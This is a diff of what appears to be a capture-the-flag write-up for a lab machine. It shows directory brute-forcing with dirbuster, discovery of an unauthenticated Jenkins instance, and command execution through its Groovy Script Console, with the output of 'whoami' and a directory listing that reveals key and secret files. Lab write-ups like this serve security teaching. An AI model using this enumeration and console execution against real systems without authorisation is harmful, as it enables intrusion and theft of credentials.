@@ -26,23 +26,109 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 117.93 seconds
 ```
 
-two http ports
+two http ports stand out
+Going to run dirbuster on them
 80, 50000
 
-
+### Running Dirbuster on IIS 10.0
 ```
 dirbuster -u http://10.10.10.63 -l /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 15
 Starting OWASP DirBuster 1.0-RC1
 Starting dir/file list based brute forcing
-
-
 ```
 
+### Running Dirbuster on JETTY 9.4
 ```
 dirbuster -u http://10.10.10.63:50000 -l /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 15
 Starting OWASP DirBuster 1.0-RC1
 Starting dir/file list based brute forcing
+Dir found: /askjeeves/ - 200
+Dir found: /askjeeves/about/ - 200
+Dir found: / - 200
+File found: /error.html - 200
+File found: /jeeves.PNG - 200
+Dir found: /askjeeves/people/ - 200
 
 ```
+
+Testing out 10.10.10.63:50000/askjeeves
+Discovered, anonymous access, navigated to Manage Jenkins
+Clicked Script Console -
+
+Type in an arbitrary Groovy script and execute it on the server. 
+Useful for trouble-shooting and diagnostics. 
+Use the ‘println’ command to see the output (if you use System.out, it will go to the server’s stdout, which is harder to see.) Example:
+
+println(Jenkins.instance.pluginManager.plugins)
+
+All the classes from all the plugins are visible. jenkins.*, jenkins.model.*, hudson.*, and hudson.model.* are pre-imported.
+
+### Groovy Script Test
+```
+cmd = "whoami"
+println cmd.execute().text
+
+Result
+
+jeeves\kohsuke
+```	
+
+```
+cmd = "cmd.exe /c dir"
+println cmd.execute().text
+ 
+Result
+
+ Volume in drive C has no label.
+ Volume Serial Number is BE50-B1C9
+
+ Directory of C:\Users\Administrator\.jenkins
+
+05/27/2018  03:12 PM    <DIR>          .
+05/27/2018  03:12 PM    <DIR>          ..
+05/27/2018  05:27 PM                48 .owner
+05/27/2018  03:00 PM             1,756 config.xml
+05/27/2018  02:46 PM               156 hudson.model.UpdateCenter.xml
+05/27/2018  03:12 PM             1,178 hudson.plugins.emailext.ExtendedEmailPublisher.xml
+11/03/2017  10:43 PM               374 hudson.plugins.git.GitTool.xml
+11/03/2017  10:33 PM             1,712 identity.key.enc
+11/03/2017  10:46 PM                94 jenkins.CLI.xml
+12/24/2017  03:35 PM            75,276 jenkins.err.log
+11/03/2017  10:47 PM           360,448 jenkins.exe
+11/03/2017  10:47 PM               331 jenkins.exe.config
+05/27/2018  02:47 PM                 4 jenkins.install.InstallUtil.lastExecVersion
+11/03/2017  10:45 PM                 4 jenkins.install.UpgradeWizard.state
+11/03/2017  10:46 PM               138 jenkins.model.DownloadSettings.xml
+12/24/2017  03:38 PM             2,688 jenkins.out.log
+05/27/2018  02:45 PM                 4 jenkins.pid
+11/03/2017  10:46 PM               169 jenkins.security.QueueItemAuthenticatorConfiguration.xml
+11/03/2017  10:46 PM               162 jenkins.security.UpdateSiteWarningsConfiguration.xml
+11/03/2017  10:47 PM        74,271,222 jenkins.war
+05/27/2018  02:45 PM            34,147 jenkins.wrapper.log
+11/03/2017  10:49 PM             2,881 jenkins.xml
+11/03/2017  10:33 PM    <DIR>          jobs
+11/03/2017  10:33 PM    <DIR>          logs
+05/27/2018  02:47 PM               907 nodeMonitors.xml
+11/03/2017  10:33 PM    <DIR>          nodes
+11/03/2017  10:44 PM    <DIR>          plugins
+11/03/2017  10:47 PM               129 queue.xml.bak
+11/03/2017  10:33 PM                64 secret.key
+11/03/2017  10:33 PM                 0 secret.key.not-so-secret
+12/24/2017  03:47 AM    <DIR>          secrets
+11/08/2017  09:52 AM    <DIR>          updates
+11/03/2017  10:33 PM    <DIR>          userContent
+11/03/2017  10:33 PM    <DIR>          users
+11/03/2017  10:47 PM    <DIR>          war
+11/03/2017  10:43 PM    <DIR>          workflow-libs
+              24 File(s)     74,753,892 bytes
+              12 Dir(s)   7,267,758,080 bytes free
+
+```
+
+
+
+
+
+
 
 
